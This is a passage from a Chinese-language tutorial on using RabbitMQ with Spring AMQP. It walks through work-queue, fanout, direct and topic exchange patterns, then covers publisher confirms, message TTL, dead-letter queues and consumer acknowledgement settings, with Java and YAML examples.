Queue\u3002Virtual Host \u662f\u4e00\u4e2a\u903b\u8f91\u6982\u5ff5\uff0c\u5b83\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7a7a\u95f4\uff0c\u4e0d\u540c\u7684 Virtual Host \u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002\u5728 Rabbit MQ \u7ba1\u7406\u754c\u9762\u4e2d\uff0c\u53ef\u4ee5\u521b\u5efa Virtual Host\u3002 \u7136\u540e\uff0c\u70b9\u51fb\u7528\u6237\u7ba1\u7406\u754c\u9762\u7684\u7528\u6237\u540d\uff0c\u8fdb\u5165\u7528\u6237\u8be6\u60c5\uff0c\u4f7f\u7528 Set Permission \u6765\u8bbe\u7f6e\u7528\u6237\u80fd\u591f\u8bbf\u95ee\u7684 Virtual Host\u3002 \u7f13\u51b2\u961f\u5217\u6a21\u5f0f \u73b0\u5728\uff0c\u6211\u4eec\u4f7f\u7528 Spring AMQP \u6765\u5b9e\u73b0\u4e00\u4e2a\u7f13\u51b2\u961f\u5217\u6a21\u5f0f\u3002\u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'org.springframework.amqp:spring-rabbit:3.1.7' \u5982\u679c\u662f\u76f4\u63a5\u4f7f\u7528 Rabbit MQ\uff0c\u53ef\u4ee5\u7528\u4e0b\u6587\u7684\u4ee3\u7801\uff0c ConnectionFactory connectionFactory = new CachingConnectionFactory(); AmqpAdmin admin = new RabbitAdmin(connectionFactory); admin.declareQueue(new Queue(\"myqueue\")); AmqpTemplate template = new RabbitTemplate(connectionFactory); template.convertAndSend(\"myqueue\", \"foo\"); String foo = (String) template.receiveAndConvert(\"myqueue\"); \u4f46\u662f\uff0c\u80af\u5b9a\u662f\u4f7f\u7528 Spring Bean \u624d\u66f4\u5408\u7406\u3002 package io.github.fingerbone; import org.springframework.amqp.core.AmqpAdmin; import org.springframework.amqp.core.AmqpTemplate; import org.springframework.amqp.core.Queue; import org.springframework.amqp.rabbit.connection.CachingConnectionFactory; import org.springframework.amqp.rabbit.connection.ConnectionFactory; import org.springframework.amqp.rabbit.core.RabbitAdmin; import org.springframework.amqp.rabbit.core.RabbitTemplate; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class RabbitConfig { @Bean public ConnectionFactory connectionFactory() { var factory = new CachingConnectionFactory(); factory.setHost(\"localhost\"); factory.setUsername(\"user\"); factory.setPassword(\"password\"); factory.setVirtualHost(\"/\"); return factory; } @Bean public AmqpAdmin amqpAdmin() { return new RabbitAdmin(connectionFactory()); } @Bean public AmqpTemplate amqpTemplate() { return new RabbitTemplate(connectionFactory()); } @Bean public Queue foodQueue() { return new Queue(\"food\"); } } \u5982\u679c\u4f60\u9700\u8981\u521b\u5efa\u591a\u4e2a Queue\uff0c\u4f7f\u7528\u6211\u4eec\u4e4b\u524d\u8bb2\u4f9d\u8d56\u6ce8\u5165\u7684\u76f8\u5173\u77e5\u8bc6\u5373\u53ef\u3002 @Bean(\"queue1\") public Queue queue1() { return new Queue(\"queue1\"); } @Bean(\"queue2\") public Queue queue2() { return new Queue(\"queue2\"); } \u7136\u540e\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c @RestController @RequiredArgsConstructor public class ProducerController { private final RabbitTemplate rabbitTemplate; @GetMapping(\"/apple\") public Mono<Void> apple() { rabbitTemplate.convertAndSend(\"food\", \"apple\"); return Mono.empty(); } } \u8c03\u7528\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u5df2\u7ecf\u53d1\u9001\u5230\u4e86\u961f\u5217\u4e2d\u3002 \u7136\u540e\u6211\u4eec\u6dfb\u52a0\u4e00\u4e2a\u6d88\u8d39\u8005\uff0c\u4f7f\u7528 @RabbitListener \u6ce8\u89e3\uff0c\u6765\u76d1\u542c\u961f\u5217\u3002 @Component @RequiredArgsConstructor public class Consumer { @RabbitListener(queues = \"food\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } } @RabbitListener \u6ce8\u89e3\u7528\u6765\u76d1\u542c\u961f\u5217\uff0c queues \u53c2\u6570\u7528\u6765\u6307\u5b9a\u961f\u5217\u540d\uff0c @RabbitHandler \u6ce8\u89e3\u7528\u6765\u6307\u5b9a\u5904\u7406\u65b9\u6cd5\u3002\u5982\u679c\u52a0 @RabbitListener \u5230\u7c7b\u4e0a\uff0c\u5b83\u4f1a\u4f5c\u7528\u5728\u6240\u6709\u65b9\u6cd5\u4e0a\u3002\u6b64\u65f6\uff0c\u5982\u679c\u6709\u591a\u4e2a\u6d88\u8d39\u8005\uff0c\u90a3\u4e48\u6d88\u606f\u9ed8\u8ba4\u4f1a\u88ab\u5e73\u5747\u5206\u914d\u5230\u6bcf\u4e2a\u6d88\u8d39\u8005\u3002\u6d88\u8d39\u8005\u5904\u7406\u4e86\u6d88\u606f\u540e\uff0c\u6d88\u606f\u5c31\u4f1a\u4ece\u961f\u5217\u4e2d\u5220\u9664\u3002 Rabbit MQ \u662f\u5b8c\u7f8e\u8f6c\u53d1\u7684\uff0c\u5982\u679c\u4f60\u4e4b\u524d\u4f20\u9012\u4e00\u4e2a\u522b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u91cc\u4e5f\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u5bf9\u8c61\u3002\u4f8b\u5982\uff0c\u4f60\u4f20\u9012\u4e86\u4e00\u4e2a Apple \u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd9\u91cc\u4e5f\u4f1a\u63a5\u6536\u5230\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u8fc7\u4f60\u9700\u8981\u628a\u53c2\u6570\u6539\u6210\u5bf9\u5e94\u7684\u7c7b\u578b\u3002 \u5982\u679c\u4f60\u7684\u751f\u4ea7\u8005\u548c\u6d88\u8d39\u8005\u4f7f\u7528\u4e0d\u540c\u7684\u8bed\u8a00\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u4f7f\u7528\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002Rabbit MQ \u9ed8\u8ba4\u4f7f\u7528\u7684\u662f Java \u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u591f\u901a\u7528\uff0c\u56e0\u6b64\uff0c\u4f60\u9700\u8981\u4f7f\u7528 JSON \u6216\u8005 Protobuf \u7b49\u65b9\u5f0f\u3002\u4f7f\u7528 MessageConverter \u6765\u6307\u5b9a\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u65b9\u5f0f\u3002 @Bean public MessageConverter messageConverter() { return new Jackson2JsonMessageConverter(); } \u7136\u540e\uff0c\u4f60\u9700\u8981\u5728 RabbitTemplate \u4e2d\u6307\u5b9a MessageConverter\uff0c @Bean public AmqpTemplate amqpTemplate() { var template = new RabbitTemplate(connectionFactory()); template.setMessageConverter(messageConverter()); return template; } \u5de5\u4f5c\u961f\u5217\u6a21\u5f0f \u5de5\u4f5c\u961f\u5217\u6a21\u5f0f\u662f\u591a\u4e2a\u6d88\u8d39\u8005\u6d88\u8d39\u540c\u4e00\u4e2a\u961f\u5217\u7684\u6d88\u606f\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8d1f\u8f7d\u5747\u8861\u7684\u4f5c\u7528\u3002\u5728 Rabbit MQ \u4e2d\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u6d88\u8d39\u8005\u7684\u6570\u91cf\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0\u8d1f\u8f7d\u5747\u8861\u3002 @Bean public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory() { var factory = new SimpleRabbitListenerContainerFactory(); factory.setConnectionFactory(connectionFactory()); factory.setConcurrentConsumers(3); factory.setMaxConcurrentConsumers(10); return factory; } SimpleRabbitListenerContainerFactory \u662f\u7528\u6765\u8bbe\u7f6e\u6d88\u8d39\u8005\u7684\u6570\u91cf\u7684\uff0c setConcurrentConsumers \u662f\u8bbe\u7f6e\u521d\u59cb\u6d88\u8d39\u8005\u7684\u6570\u91cf\uff0c setMaxConcurrentConsumers \u662f\u8bbe\u7f6e\u6700\u5927\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002 \u5982\u679c\u4f60\u4f7f\u7528\u7684\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Kubernetes \u6765\u81ea\u52a8\u6269\u5bb9\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002\u5982\u679c\u662f Spring Cloud\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u4f7f\u7528 Spring Cloud Stream \u6765\u81ea\u52a8\u6269\u5bb9\u6d88\u8d39\u8005\u7684\u6570\u91cf\u3002 \u6247\u51fa\u4ea4\u6362\u673a\u6a21\u5f0f \u6247\u51fa\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u5c06\u6d88\u606f\u53d1\u9001\u5230\u591a\u4e2a\u961f\u5217\uff0c\u6bcf\u4e2a\u961f\u5217\u6709\u4e00\u4e2a\u6d88\u8d39\u8005\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u5e7f\u64ad\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public FanoutExchange fanoutExchange() { return new FanoutExchange(\"fanout\"); } \u8fd9\u91cc\u7684\u4ea4\u6362\u673a\u662f FanoutExchange\u3002\u4ea4\u6362\u673a\u7684\u7c7b\u578b\u6709\u56db\u79cd\uff0c\u5206\u522b\u662f DirectExchange\uff0cFanoutExchange\uff0cTopicExchange \u548c HeadersExchange\u3002\u524d\u4e09\u79cd\u5bf9\u5e94\u4e86\u8def\u7531\u4ea4\u6362\u673a\uff0c\u6247\u51fa\u4ea4\u6362\u673a\u548c\u4e3b\u9898\u4ea4\u6362\u673a\u3002\u6700\u540e\u4e00\u79cd\u662f HeadersExchange\uff0c\u5b83\u662f\u6839\u636e\u6d88\u606f\u5934\u6765\u8def\u7531\u7684\uff0c\u8fd9\u91cc\u4e0d\u505a\u8bb2\u89e3\u3002 \u4f60\u4e5f\u53ef\u4ee5\u5728 Rabbit MQ \u7ba1\u7406\u754c\u9762\u4e2d\u67e5\u770b\u4ea4\u6362\u673a\u3002 \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding foodBinding() { return BindingBuilder.bind(foodQueue()).to(fanoutExchange()); } \u6b64\u5916\uff0c\u4e3a\u4e86\u6f14\u793a\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u961f\u5217\uff0c @Bean public Queue trashQueue() { return new Queue(\"trash\"); } @Bean public Binding trashBinding() { return BindingBuilder.bind(trashQueue()).to(fanoutExchange()); } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u6d88\u8d39\u8005\uff0c @Component @RequiredArgsConstructor public class FoodConsumer { @RabbitListener(queues = \"food\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } @RabbitListener(queues = \"trash\") @RabbitHandler public void trash(String message) { System.out.println(\"Yuck! I threw away \" + message); } } \u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c @GetMapping(\"/banana\") public Mono<Void> banana() { rabbitTemplate.convertAndSend(\"fanout\", \"\", \"banana\"); return Mono.empty(); } \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f routing key\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981\uff0c\u6240\u4ee5\u4e3a\u7a7a\u3002 \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /banana \uff0c\u90a3\u4e48\u4e24\u4e2a\u6d88\u8d39\u8005\u90fd\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002 \u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f \u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u6839\u636e routing key \u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u8d77\u5230\u4e86\u8def\u7531\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public DirectExchange directExchange() { return new DirectExchange(\"direct\"); } \u8fd9\u91cc\u6211\u4eec\u7528\u4e24\u4e2a\u65b0\u7684\u961f\u5217\uff0c @Bean public Queue fruitQueue() { return new Queue(\"fruit\"); } @Bean public Queue vegetableQueue() { return new Queue(\"vegetable\"); } \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding fruitBinding() { return BindingBuilder.bind(fruitQueue()).to(directExchange()).with(\"fruit\"); } @Bean public Binding vegetableBinding() { return BindingBuilder.bind(vegetableQueue()).to(directExchange()).with(\"vegetable\"); } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e24\u4e2a\u6d88\u8d39\u8005\uff0c @Component @RequiredArgsConstructor public class FruitConsumer { @RabbitListener(queues = \"fruit\") @RabbitHandler public void consume(String message) { System.out.println(\"Yummy! I ate \" + message); } @RabbitListener(queues = \"vegetable\") @RabbitHandler public void trash(String message) { System.out.println(\"Wonderful! I ate \" + message); } } \u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c @GetMapping(\"/carrot\") public Mono<Void> carrot() { rabbitTemplate.convertAndSend(\"direct\", \"vegetable\", \"carrot\"); return Mono.empty(); } @GetMapping(\"/grape\") public Mono<Void> grape() { rabbitTemplate.convertAndSend(\"direct\", \"fruit\", \"grape\"); return Mono.empty(); } \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /carrot \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e00\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /grape \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e8c\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\u3002 \u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f \u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f\u662f\u4e00\u4e2a\u751f\u4ea7\u8005\u53d1\u9001\u6d88\u606f\u5230\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c\u4ea4\u6362\u673a\u6839\u636e\u901a\u914d\u7b26\u5c06\u6d88\u606f\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u961f\u5217\u3002\u8fd9\u65f6\uff0c\u6d88\u606f\u961f\u5217\u4f9d\u7136\u662f\u8def\u7531\u7684\u4f5c\u7528\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u4ea4\u6362\u673a\uff0c @Bean public TopicExchange topicExchange() { return new TopicExchange(\"topic\"); } \u7136\u540e\uff0c\u6211\u4eec\u9700\u8981\u5c06\u961f\u5217\u7ed1\u5b9a\u5230\u4ea4\u6362\u673a\uff0c @Bean public Binding fruitBinding() { return BindingBuilder.bind(fruitQueue()).to(topicExchange()).with(\"fruit.*\"); } @Bean public Binding vegetableBinding() { return BindingBuilder.bind(vegetableQueue()).to(topicExchange()).with(\"vegetable.*\"); } \u8fd9\u91cc\u7684\u901a\u914d\u7b26\u6709\u4e24\u79cd\uff0c * \u548c # \uff0c * \u8868\u793a\u4e00\u4e2a\u5355\u8bcd\uff0c # \u8868\u793a\u591a\u4e2a\u5355\u8bcd\u3002 \u7136\u540e\uff0c\u6211\u4eec\u4f9d\u7136\u4f7f\u7528\u4e4b\u524d\u7684\u6d88\u8d39\u8005\uff0c\u552f\u4e00\u533a\u522b\u662f\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539 routing key \u4e3a\u4e3b\u9898\u7684\u5f62\u5f0f\uff0c\u5373 {first}.{second}.{third} \u3002 @GetMapping(\"/apple\") public Mono<Void> apple() { rabbitTemplate.convertAndSend(\"topic\", \"fruit.apple\", \"apple\"); return Mono.empty(); } @GetMapping(\"/tomato\") public Mono<Void> tomato() { rabbitTemplate.convertAndSend(\"topic\", \"vegetable.tomato\", \"tomato\"); return Mono.empty(); } \u73b0\u5728\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /apple \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e00\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\uff0c\u5982\u679c\u6211\u4eec\u8bbf\u95ee /tomato \uff0c\u90a3\u4e48\u53ea\u6709\u7b2c\u4e8c\u4e2a\u6d88\u8d39\u8005\u4f1a\u6536\u5230\u6d88\u606f\u3002 \u4ece\u4e0a\u9762\u53ef\u4ee5\u770b\u51fa\uff0c\u4e3b\u9898\u4ea4\u6362\u673a\u6a21\u5f0f\u53ea\u662f\u8def\u7531\u4ea4\u6362\u673a\u6a21\u5f0f\u7684\u4e00\u4e2a\u6269\u5c55\uff0c\u5b83\u53ef\u4ee5\u6839\u636e\u901a\u914d\u7b26\u6765\u8def\u7531\u6d88\u606f\u3002 \u53ef\u9760\u6027\u4fdd\u969c \u73b0\u5728\u6211\u4eec\u8003\u8651\u6dfb\u52a0\u4e86\u6d88\u606f\u961f\u5217\u7cfb\u7edf\u7684\u53ef\u9760\u6027\u4fdd\u969c\uff1a\u6574\u4e2a\u94fe\u8def\u662f\u751f\u4ea7\u8005\uff0c\u4ea4\u6362\u673a\uff0c\u961f\u5217\uff0c\u6d88\u8d39\u8005\u3002\u4ea4\u6362\u673a\u4e0e\u961f\u5217\u95f4\u7684\u53ef\u9760\u6027\u7531 Rabbit MQ \u4fdd\u969c\uff0c\u6211\u4eec\u53ea\u8981\u8003\u8651\u751f\u4ea7\u8005\u53ef\u9760\u6027\u548c\u6d88\u8d39\u8005\u53ef\u9760\u6027\u3002 \u751f\u4ea7\u8005\u53ef\u9760\u6027 \u9996\u5148\uff0c\u5bf9\u4e8e\u8fde\u63a5\u7684\u53ef\u9760\u6027\uff0c\u53ef\u4ee5\u5728 application.yml \uff0c\u53ef\u4ee5\u8bbe\u7f6e RabbitMQ \u7684\u8fde\u63a5\u8d85\u65f6\u548c\u91cd\u8fde\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u5728\u7f51\u7edc\u6296\u52a8\u6216 RabbitMQ \u670d\u52a1\u6682\u65f6\u4e0d\u53ef\u7528\u65f6\uff0c\u751f\u4ea7\u8005\u80fd\u81ea\u52a8\u6062\u590d\u8fde\u63a5\u3002 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest # \u914d\u7f6e\u8fde\u63a5\u8d85\u65f6\uff08\u6beb\u79d2\uff09 connection-timeout: 15000 # \u542f\u7528\u81ea\u52a8\u91cd\u8fde listener: simple: retry: enabled: true max-attempts: 5 initial-interval: 1000 multiplier: 2.0 max-interval: 10000 \u5176\u6b21\uff0c\u8fd8\u6709\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0c spring: rabbitmq: publisher-confirm-type: correlated publisher-confirm-type \u6709publisher-confirm-type \u6709\u4ee5\u4e0b\u51e0\u79cd\u914d\u7f6e\u9009\u9879\uff0c\u7528\u4e8e\u63a7\u5236 RabbitMQ \u6d88\u606f\u7684\u53d1\u5e03\u786e\u8ba4\u673a\u5236\uff1a none \u5373\u5173\u95ed\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitMQ \u4e0d\u4f1a\u4e3a\u751f\u4ea7\u8005\u7684\u6d88\u606f\u53d1\u5e03\u63d0\u4f9b\u4efb\u4f55\u786e\u8ba4\u3002\u4f18\u70b9\uff1a\u6027\u80fd\u8f83\u9ad8\u3002\u7f3a\u70b9\uff1a\u65e0\u6cd5\u4fdd\u969c\u6d88\u606f\u7684\u53ef\u9760\u6295\u9012\uff0c\u5982\u679c\u6d88\u606f\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e22\u5931\uff0c\u751f\u4ea7\u8005\u65e0\u6cd5\u5f97\u77e5\u3002\u9002\u7528\u573a\u666f\uff1a\u5bf9\u6d88\u606f\u53ef\u9760\u6027\u8981\u6c42\u8f83\u4f4e\u7684\u975e\u5173\u952e\u573a\u666f\u3002 correlated \u5373\u542f\u7528\u5f02\u6b65\u7684\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitTemplate \u4f1a\u901a\u8fc7\u56de\u8c03\u51fd\u6570\u83b7\u53d6\u6d88\u606f\u662f\u5426\u6210\u529f\u5230\u8fbe\u4ea4\u6362\u673a\u3002\u4f18\u70b9\uff1a\u6027\u80fd\u8f83\u597d\uff0c\u4e14\u652f\u6301\u5f02\u6b65\u56de\u8c03\uff0c\u53ef\u4ee5\u7cbe\u51c6\u8ffd\u8e2a\u6bcf\u6761\u6d88\u606f\u7684\u72b6\u6001\u3002\u7f3a\u70b9\uff1a\u9700\u8981\u989d\u5916\u5b9e\u73b0\u56de\u8c03\u903b\u8f91\u3002\u9002\u7528\u573a\u666f\uff1a\u5927\u591a\u6570\u4e1a\u52a1\u573a\u666f\uff0c\u9700\u5173\u6ce8\u6d88\u606f\u662f\u5426\u6210\u529f\u53d1\u9001\u5230 RabbitMQ\u3002 \u5f55\u5165\uff0c\u53ef\u4ee5\u8fd9\u6837\u914d\u7f6e\u56de\u8c03\uff0c @Bean public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory) { RabbitTemplate rabbitTemplate = new RabbitTemplate(connectionFactory); rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -> { if (ack) { System.out.println(\"Message delivered successfully: \" + correlationData); } else { System.err.println(\"Message delivery failed: \" + cause); } }); return rabbitTemplate; } \u5728 correlationData \u4e2d\u5305\u542b\u4e86\u5b8c\u6574\u7684\u539f\u59cb\u7684\u6d88\u606f\uff0c\u5982\u679c\u9700\u8981\u53ef\u4ee5\u76f4\u63a5\u91cd\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u56de\u8c03\u7684\u65b9\u6cd5\u7b7e\u540d\u53ef\u80fd\u4f1a\u968f\u7248\u672c\u4e0d\u540c\u6709\u4e00\u4e9b\u6539\u52a8\u3002 simple \u5373\u542f\u7528\u540c\u6b65\u7684\u751f\u4ea7\u8005\u786e\u8ba4\u673a\u5236\uff0cRabbitTemplate \u7684 convertAndSend \u65b9\u6cd5\u4f1a\u963b\u585e\uff0c\u76f4\u5230\u786e\u8ba4\u6d88\u606f\u5df2\u88ab RabbitMQ \u6210\u529f\u63a5\u6536\u3002\u4f18\u70b9\uff1a\u5b9e\u73b0\u7b80\u5355\uff0c\u786e\u8ba4\u7ed3\u679c\u6e05\u6670\u3002\u7f3a\u70b9\uff1a\u6027\u80fd\u6781\u5dee\uff0c\u4e00\u822c\u4e0d\u4f7f\u7528\u3002 \u4f8b\u5982\uff0c spring: rabbitmq: publisher-confirm-type: simple @GetMapping(\"/sendSyncMessage\") public Mono<Void> sendSyncMessage() { try { rabbitTemplate.convertAndSend(\"exchange\", \"routingKey\", \"message\"); System.out.println(\"Message sent successfully!\"); } catch (Exception e) { System.err.println(\"Message delivery failed: \" + e.getMessage()); } return Mono.empty(); } \u901a\u5e38\u63a8\u8350\u4f7f\u7528 Correlate \u6a21\u5f0f\u3002 \u6b64\u5916\u8fd8\u53ef\u4ee5\u914d\u7f6e TTL \u5373\u4e00\u4e2a Time To Live \u5c5e\u6027\uff0c\u53ef\u4ee5\u52a0\u5728\u6bcf\u4e00\u4e2a\u6d88\u606f\u4e2d\u3002\u5f53\u4e00\u4e2a\u6d88\u606f\u6324\u538b\u8d85\u8fc7 TTL\uff0c\u4f1a\u81ea\u52a8 reject\uff0c\u5373\u4e22\u5f03\u6d88\u606f\u3002 @GetMapping(\"/sendMessageWithTTL\") public Mono<Void> sendMessageWithTTL() { // \u521b\u5efa\u6d88\u606f\u5c5e\u6027\uff0c\u6307\u5b9a TTL \u4e3a 30 \u79d2 MessagePostProcessor messagePostProcessor = message -> { message.getMessageProperties().setExpiration(\"30000\"); // TTL = 30 \u79d2 return message; }; // \u53d1\u9001\u6d88\u606f\u5230\u4ea4\u6362\u673a\uff0c\u643a\u5e26\u81ea\u5b9a\u4e49 TTL rabbitTemplate.convertAndSend(\"example.exchange\", \"example.routingKey\", \"Message with TTL\", messagePostProcessor); System.out.println(\"Message sent with TTL of 30 seconds\"); return Mono.empty(); } \u8fd8\u53ef\u4ee5\u7ed9\u6574\u4e2a\u961f\u5217\u914d\u7f6e TTL\uff0c @Bean public Queue exampleQueue() { return QueueBuilder.durable(\"exampleQueue\") .withArgument(\"x-message-ttl\", 60000) // \u8bbe\u7f6e\u6d88\u606f\u7684\u5b58\u6d3b\u65f6\u95f4\u4e3a 60 \u79d2\uff0860000 \u6beb\u79d2\uff09 .withArgument(\"x-dead-letter-exchange\", \"dlx.exchange\") // \u914d\u7f6e\u6b7b\u4fe1\u4ea4\u6362\u673a .withArgument(\"x-dead-letter-routing-key\", \"dlx.routingKey\") // \u914d\u7f6e\u6b7b\u4fe1\u8def\u7531\u952e .build(); } reject \u5c3d\u7ba1\u662f\u4e22\u5f03\u6d88\u606f\uff0c\u4f46\u4f60\u4e5f\u53ef\u4ee5\u628a\u4e22\u5f03\u7684\u6d88\u606f\u79f0\u653e\u5230\u4e00\u4e2a\u6b7b\u4fe1\u4ea4\u6362\u673a\u4e2d\uff0c\u7136\u540e\u653e\u5230\u6b7b\u4fe1\u961f\u5217\u3002\u8fd9\u6837\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u88ab\u6536\u96c6\u3002 \u8fd9\u91cc\u7684 durable \u662f\u6307\u4e45\u5316\u961f\u5217\uff0c\u4f1a\u5728\u540e\u9762\u4ecb\u7ecd\u3002 \u6d88\u8d39\u8005\u53ef\u9760\u6027 \u6d88\u8d39\u8005\u7684\u8fde\u63a5\u53ef\u9760\u6027\u540c\u6837\u53ef\u4ee5\u7528\u4e4b\u524d\u7684\u914d\u7f6e\u4fdd\u969c\u3002 \u5bf9\u4e8e\u6d88\u606f\u5904\u7406\u7684\u53ef\u9760\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528\u786e\u8ba4\u673a\u5236\uff0c \u7b2c\u4e00\u79cd\u6a21\u5f0f\u662f\u624b\u52a8\u6a21\u5f0f\uff0c spring: rabbitmq: listener: simple: acknowledge-mode: manual @RabbitListener(queues = \"exampleQueue\") public void processMessage(String message, Channel channel, @Header(AmqpHeaders.DELIVERY_TAG) long deliveryTag) { try { // \u5904\u7406\u6d88\u606f\u903b\u8f91 System.out.println(\"Processing message: \" + message); // \u624b\u52a8\u786e\u8ba4\u6d88\u606f channel.basicAck(deliveryTag, false); } catch (Exception e) { System.err.println(\"Failed to process message: \" + e.getMessage()); try { // \u5904\u7406\u5931\u8d25\uff0c\u62d2\u7edd\u6d88\u606f\u5e76\u91cd\u65b0\u6295\u9012 channel.basicNack(deliveryTag, false, true); } catch (IOException ioException) { System.err.println(\"Failed to nack message: \" + ioException.getMessage()); } } } \u66f4\u63a8\u8350\u81ea\u52a8\u6a21\u5f0f\uff1a\u5f53\u51fa\u73b0\u4e1a\u52a1\u5f02\u5e38\u65f6\uff0c\u81ea\u52a8\u8fd4\u56de nack \u8bf7\u6c42\uff0cnack \u6d88\u606f\u4f1a\u5bfc\u81f4\u6d88\u606f\u961f\u5217\u5c06\u53d1\u9001\u7684\u6d88\u606f\u91cd\u65b0\u653e\u56de\u961f\u5217\u4e2d\uff1b\u5f53 Rabbit MQ \u901a\u4fe1\u5f02\u5e38\u65f6\uff0c\u6216\u63a5\u53d7\u5230\u9519\u8bef\u7684\u6d88\u606f\uff0c\u81ea\u52a8\u8fd4\u56de reject \u8bf7\u6c42\uff0c\u8fd9\u4e2a\u6d88\u606f\u88ab\u4e22\u5f03\u3002 \u6ce8\u610f\uff0c\u8fd9\u65f6\u8981\u914d\u7f6e\u4e00\u4e2a\u6700\u5927\u91cd\u8bd5\u6b21\u6570\uff0c\u4e0d\u7136\u4f1a\u5bfc\u81f4\u6d88\u606f\u6324\u538b\u3002\u5f53\u6d88\u606f\u91cd\u8bd5\u8d85\u8fc7\u6b21\u6570\u65f6\uff0c\u540c\u6837\u4f1a reject\u3002 spring: rabbitmq: listener: simple: acknowledge-mode: auto # \u81ea\u52a8\u786e\u8ba4\u6a21\u5f0f retry: 